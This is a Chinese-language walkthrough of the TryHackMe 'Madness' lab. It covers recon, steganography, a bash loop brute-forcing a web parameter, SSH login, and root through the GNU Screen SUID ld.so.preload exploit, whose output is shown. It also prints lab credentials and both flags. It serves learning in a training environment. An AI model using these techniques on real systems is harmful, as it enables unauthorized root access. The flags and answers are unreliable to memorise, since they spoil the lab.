# 服务发现
```
┌──(root💀kali)-[~/tryhackme/Madness]
└─#  nmap -sV -Pn 10.10.123.91          
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-27 23:19 EDT
Nmap scan report for 10.10.123.91
Host is up (0.35s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.89 seconds

```

# 目录爆破
```
┌──(root💀kali)-[~/dirsearch]
└─#  python3 dirsearch.py -w /usr/share/wordlists/Web-Content/directory-list-2.3-medium.txt -e* -t 100 -u http://10.10.123.91

 _|. _ _  _  _  _ _|_    v0.3.8
(_||| _) (/_(_|| (_| )

Extensions: * | HTTP method: get | Threads: 100 | Wordlist size: 220521

Error Log: /root/dirsearch/logs/errors-21-09-27_23-20-38.log

Target: http://10.10.123.91

[23:20:39] Starting: 
[23:20:40] 200 -   11KB - /
[23:26:05] 403 -  278B  - /server-status  
```

# 主页分析
没有任何目录，只有一个首页
网页源代码里有一行注释
>They will never find me

上面代码指向一张不能打开的图片，地址是```http://10.10.123.91/thm.jpg```

把图片下载到本地分析

用exiftool分析文件,发现按照文件分析这本来是一个png文件，但是却以jpg作为后缀
```
┌──(root💀kali)-[~/tryhackme/Madness]
└─#  exiftool thm.jpg
ExifTool Version Number         : 12.16
File Name                       : thm.jpg
Directory                       : .
File Size                       : 22 KiB
File Modification Date/Time     : 2021:09:27 23:56:02-04:00
File Access Date/Time           : 2021:09:27 23:56:02-04:00
File Inode Change Date/Time     : 2021:09:27 23:56:02-04:00
File Permissions                : rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Warning                         : PNG image did not start with IHDR
```

查看图片源，文件头声明是PNG
```
┌──(root💀kali)-[~/tryhackme/Madness]
└─#  head thm.jpg
�PNG
▒
��C


▒▒��C
�����

���}!1AQa"q2��# B��R��$3br�
▒▒%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz���������������������������������������������������������������������������

���w!1AQaq"2B����       # 3R�br�
$4�%�▒▒&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz��������������������������������������������������������������������������

```

用sublime打开thm.jpg文件，把
```8950 4e47 0d0a 1a0a 0000 0001```

改成

```ffd8 ffe0 0010 4a46 4946 0001```

然后保存。再打开thm.jpg文件，图片可以正常显示，根据图片提示
```
hidden directory
/th1s_1s_h1dd3n
```

打开```http://10.10.123.91/th1s_1s_h1dd3n/```
显示：
>Welcome! I have been expecting you!
>To obtain my identity you need to guess my secret!
>Secret Entered:
>That is wrong! Get outta here!


查看网页源代码，有一行注释
>It's between 0-99 but I don't think anyone will look here


我们在网页上加上一个secret参数：```http://10.10.123.91/th1s_1s_h1dd3n/?secret=0```

网页发送了变化：Secret Entered: 0

# 编写一个bash脚本，遍历0~99的请求参数，把结果输出到answer.txt
```
# !/bin/bash
for i in {0..100}
do 
    curl http://10.10.123.91/th1s_1s_h1dd3n/?secret=$i >> answer.txt
done
```

查阅answer.txt显示73返回不一样
```
<html>
<head>
  <title>Hidden Directory</title>
  <link href="stylesheet.css" rel="stylesheet" type="text/css">
</head>
<body>
  <div class="main">
<h2>Welcome! I have been expecting you!</h2>
<p>To obtain my identity you need to guess my secret! </p>
<!-- It's between 0-99 but I don't think anyone will look here-->

<p>Secret Entered: 73</p>

<p>Urgh, you got it right! But I won't tell you who I am! y2RPJ4QaPF!B</p>

</div>
</body>
</html>
```

```y2RPJ4QaPF!B```像是一串加密的东西，起初以为是base64，但是解不出来。有“！”这种特殊符号也不会是用户名。所以可能是一个密码


房间的提示，
1，不要进行ssh爆破，
2，用户名是一个something ROTten的东西

所以现在就是还差一个用户名，而且这个用户名很恶心


这里完全懵逼，以为是ssh的密码，一直在找用户名
结果原来是图片隐写的密码
```
┌──(root💀kali)-[~/tryhackme/Madness]
└─#  steghide extract -sf thm.jpg
Enter passphrase: 
wrote extracted data to "hidden.txt".
                                                                                                                                                                                                                                            
┌──(root💀kali)-[~/tryhackme/Madness]
└─#  cat hidden.txt 
Fine you found the password! 

Here's a username 

wbxre

I didn't say I would make it easy for you!

```

以为```wbxre```这个是一个用户名,结果这他妈原来是一个加密的字符串，加密算法是rot13
惊不惊喜
意不意外

解密出来是：```joker```，参考[这个网站](https://gchq.github.io/CyberChef/# recipe=ROT13(true,true,false,13)&input=d2J4cmU)

现在有了用户名和密码，以为终于可以登录ssh了，结果密码是错的

结果是需要把房间的这个海报照片下载到本地，然后从海报中解析出密码
```
wget https://i.imgur.com/5iW7kC8.jpg
```
# 解析出隐藏文件
```
┌──(root💀kali)-[~/tryhackme/Madness]
└─#  steghide extract -sf 5iW7kC8.jpg                                                                                                                                                                                                    1 ⨯
Enter passphrase: 
wrote extracted data to "password.txt".
                                                                                                                                                                                                                                            
┌──(root💀kali)-[~/tryhackme/Madness]
└─#  cat password.txt    
I didn't think you'd find me! Congratulations!

Here take my password

*axA&GF8dP

```

# 真是骚到飞起！

现在登录ssh，拿到user.txt
```
┌──(root💀kali)-[~/tryhackme/Madness]
└─#  ssh joker@10.10.123.91          
joker@10.10.123.91's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-170-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Sun Jan  5 18:51:33 2020 from 192.168.244.128
joker@ubuntu:~$ ls
user.txt
joker@ubuntu:~$ cat user.txt 
THM{d5781e53b130efe2f94f9b0354a5e4ea}
joker@ubuntu:~$ 
```

# 提权
传leapeas，枚举提权漏洞信息，发现screen 这个SUID可以提权

提权攻击脚本见[这里](https://www.exploit-db.com/exploits/41154)



```
joker@ubuntu:/tmp$ ./exp.sh
~ gnu/screenroot ~
[+] First, we create our shell and library...
/tmp/libhax.c: In function ‘dropshell’:
/tmp/libhax.c:7:5: warning: implicit declaration of function ‘chmod’ [-Wimplicit-function-declaration]
     chmod("/tmp/rootshell", 04755);
     ^
/tmp/rootshell.c: In function ‘main’:
/tmp/rootshell.c:3:5: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]
     setuid(0);
     ^
/tmp/rootshell.c:4:5: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]
     setgid(0);
     ^
/tmp/rootshell.c:5:5: warning: implicit declaration of function ‘seteuid’ [-Wimplicit-function-declaration]
     seteuid(0);
     ^
/tmp/rootshell.c:6:5: warning: implicit declaration of function ‘setegid’ [-Wimplicit-function-declaration]
     setegid(0);
     ^
/tmp/rootshell.c:7:5: warning: implicit declaration of function ‘execvp’ [-Wimplicit-function-declaration]
     execvp("/bin/sh", NULL, NULL);
     ^
[+] Now we create our /etc/ld.so.preload file...
[+] Triggering...
' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
[+] done!
#  id
uid=0(root) gid=0(root) groups=0(root),1000(joker)
#  cat /root/root.txt
THM{5ecd98aa66a6abb670184d7547c8124a}
#  
```